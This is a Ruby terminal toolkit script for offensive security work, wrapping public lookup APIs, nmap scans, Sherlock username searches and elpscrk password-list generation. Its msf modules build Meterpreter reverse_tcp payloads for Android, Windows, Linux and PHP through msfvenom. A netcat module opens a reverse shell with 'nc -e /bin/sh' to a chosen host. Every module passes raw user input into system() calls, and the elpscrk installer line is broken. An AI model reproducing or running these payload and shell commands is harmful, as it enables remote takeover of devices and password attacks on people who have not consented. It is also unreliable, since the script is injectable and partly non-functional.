#!/usr/local/bin/ruby

require 'colorize'
require 'artii'
require 'terminal-table'
require 'net/http'
require 'json'

# lookup modules

def iplookup
    puts "Enter IP to lookup"
    print " > "
    ip = gets.chomp
    uri = URI("http://ip-api.com/json/#{ip}")
    response = Net::HTTP.get(uri)
    parsed = JSON.parse(response)
    rows = []
    rows << ['IP', parsed['query']]
    rows << ['Country', parsed['country']]
    rows << ['City', parsed['city']]
    rows << ['ISP', parsed['isp']]
    rows << ['Latitude', parsed['lat']]
    rows << ['Longitude', parsed['lon']]
    rows << ['Region', parsed['region']]
    rows << ['Region Name', parsed['regionName']]
    rows << ['Timezone', parsed['timezone']]
    rows << ['Zip', parsed['zip']]
    table = Terminal::Table.new :title => 'IP Lookup', :headings => ['Type', 'Value'], :rows => rows
    puts table
end


def dnslookup
    puts "Enter domain to lookup"
    print " > "
    domain = gets.chomp
    uri = URI("https://api.hackertarget.com/dnslookup/?q=#{domain}")
    response = Net::HTTP.get(uri)
    puts response
end

# msf modules


def mpandroidreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .apk for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Android --arch dalvik -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.apk")
    puts "Payload created!"
end

def mpwindowsreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .exe for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Windows --arch x86 -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.exe")
    puts "Payload created!"
end

def mplinuxreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .elf for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom --platform Linux --arch x86 -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.elf")
    puts "Payload created!"
end

def mpphpreversetcp
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Enter output name (no .php for example. /home/user/Desktop/payload)"
    print " > "
    output = gets.chomp
    puts "Creating payload..."
    system("msfvenom -p php/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.php")
    puts "Payload created!"
end

# nmap modules

def defaultscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap #{ip}")
end

def fastscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -F #{ip}")
end

def stealthscan
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -sS #{ip}")
end

def udp
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -sU #{ip}")
end

def osdetect
    puts "Enter IP to scan"
    print " > "
    ip = gets.chomp
    puts "Starting scan..."
    system("nmap -O #{ip}")
end

# netcat modules

def reverseshelllinux
    puts "Enter LHOST"
    print " > "
    lhost = gets.chomp
    puts "Enter LPORT"
    print " > "
    lport = gets.chomp
    puts "Starting reverse shell..."
    system("nc -e /bin/sh #{lhost} #{lport}")
end 

# osint modules

def osintsherlock
    if File.exist?('./scripts/sherlock/sherlock/sherlock.py')
        puts "Enter username to search for"
        print " > "
        username = gets.chomp
        puts "Searching..."
        system("python3 ./scripts/sherlock/sherlock/sherlock.py #{username}")
    else
        puts "Sherlock not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Installing Sherlock..."
            system("git clone https://github.com/sherlock-project/sherlock.git ./scripts/sherlock")
            system("pip3 install -r ./scripts/sherlock/requirements.txt")
            puts "Sherlock installed!"
            puts "Use the command again to use Sherlock"
        else
            puts "Exiting..."
        end
    end
end

# misc modules
def elpscrk
    if File.exist?('./scripts/elpscrk/elpscrk.py')
        puts "Enter password level: (1-5, check elpscrk docs for more info)"
        print " > "
        level = gets.chomp
        puts "Enter minimum password length"
        print " > "
        min = gets.chomp
        puts "Enter maximum password length"
        print " > "
        max = gets.chomp
        system("python3 ./scripts/elpscrk/elpscrk.py --level #{level} --min #{min} --max #{max}")
    else
        puts "elpscrk not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Installing Elpscrk..."
            system("https://github.com/D4Vinci/elpscrk.git ./scripts/elpscrk")
            system("pip3 install -r ./scripts/elpscrk/requirements.txt")
            puts "Elpscrk installed!"
            puts "Use the command again to use Elpscrk"
        else
            puts "Exiting..."
        end
    end
end

def elpscrkleet
    if File.exist?('./scripts/elpscrk/elpscrk.py')
        puts "Note: you are in leet mode. this will make from 'password' to 'p4ssw0rd'"
        puts "Enter password level: (1-5, check elpscrk docs for more info)"
        print " > "
        level = gets.chomp
        puts "Enter minimum password length"
        print " > "
        min = gets.chomp
        puts "Enter maximum password length"
        print " > "
        max = gets.chomp
        system("python3 ./scripts/elpscrk/elpscrk.py --leet --level #{level} --min #{min} --max #{max}")
    else
        puts "elpscrk not found. Do you want to install it? (y/n)"
        print " > "
        install = gets.chomp
        if install == "y"
            puts "Installing Elpscrk..."
            system("https://github.com/D4Vinci/elpscrk.git ./scripts/elpscrk")
            system("pip3 install -r ./scripts/elpscrk/requirements.txt")
            puts "Elpscrk installed!"
            puts "Use the command again to use Elpscrk"
        else
            puts "Exiting..."
        end
    end
end